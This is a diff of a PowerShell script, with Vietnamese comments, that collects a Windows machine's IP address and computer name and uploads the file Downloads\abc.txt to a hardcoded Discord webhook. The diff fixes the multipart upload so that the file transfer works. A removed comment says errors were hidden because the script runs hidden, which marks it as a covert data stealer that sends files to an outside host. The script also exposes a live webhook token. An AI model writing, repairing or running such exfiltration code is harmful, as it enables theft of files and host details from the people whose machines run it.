@@ -1,4 +1,6 @@
 $webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"
+
+# --- Test webhook ---
 $test = @{ content = "Test message" } | ConvertTo-Json
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $test -ContentType "application/json"
@@ -8,12 +10,14 @@ try {
     exit
 }
 
-# Lấy IP với fallback
+# --- Lấy IP (fallback) ---
 try {
     $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
 } catch {
     $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
 }
+
+# --- Gửi embed thông tin ---
 $embedHash = @{
     content = "Agent Debug Mode"
     embeds = @(
@@ -28,25 +32,63 @@ $embedHash = @{
         }
     )
 }
-
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($embedHash | ConvertTo-Json -Depth 5) -ContentType "application/json"
     Write-Host "[+] Embed sent"
 } catch {
     Write-Host "[-] Embed failed: $_"
-    # In chi tiết lỗi như cũ
-}
-# Gửi embed (bắt lỗi nếu webhook chết)
-try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embed -ContentType "application/json"
-} catch {
-    # Không hiện lỗi ra console (vì chạy ẩn)
 }
 
-# Gửi file abc.txt nếu có
+# --- Gửi file abc.txt với đúng multipart format ---
 $filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
+Write-Host "[*] Checking file at: $filePath"
+
 if (Test-Path $filePath) {
+    Write-Host "[*] File found. Size: $((Get-Item $filePath).Length) bytes"
+    
+    # Tạo JSON metadata cho attachment
+    $payloadJson = @{
+        content = "File attached from $env:COMPUTERNAME"
+        attachments = @(
+            @{
+                id = 0
+                filename = "abc.txt"
+            }
+        )
+    } | ConvertTo-Json
+
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $filePath -ContentType "multipart/form-data"
-    } catch {}
+        # Tạo multipart form data
+        $multipart = [System.Net.Http.MultipartFormDataContent]::new()
+        
+        # Part 1: payload_json
+        $jsonPart = [System.Net.Http.StringContent]::new($payloadJson, [System.Text.Encoding]::UTF8, "application/json")
+        $multipart.Add($jsonPart, "payload_json")
+        
+        # Part 2: file (key phải là "files[0]")
+        $fileStream = [System.IO.File]::OpenRead($filePath)
+        $filePart = [System.Net.Http.StreamContent]::new($fileStream)
+        $filePart.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+        $multipart.Add($filePart, "files[0]", "abc.txt")
+        
+        # Gửi request
+        $client = [System.Net.Http.HttpClient]::new()
+        Write-Host "[*] Uploading file..."
+        $response = $client.PostAsync($webhookUrl, $multipart).Result
+        
+        if ($response.IsSuccessStatusCode) {
+            Write-Host "[+] File uploaded successfully!"
+        } else {
+            $errBody = $response.Content.ReadAsStringAsync().Result
+            Write-Host "[-] Upload failed. Status: $($response.StatusCode) - $errBody"
+        }
+    } catch {
+        Write-Host "[-] Exception during upload: $($_.Exception.Message)"
+    } finally {
+        if ($fileStream) { $fileStream.Dispose() }
+        if ($client) { $client.Dispose() }
+        if ($multipart) { $multipart.Dispose() }
+    }
+} else {
+    Write-Host "[!] File not found at $filePath"
 }
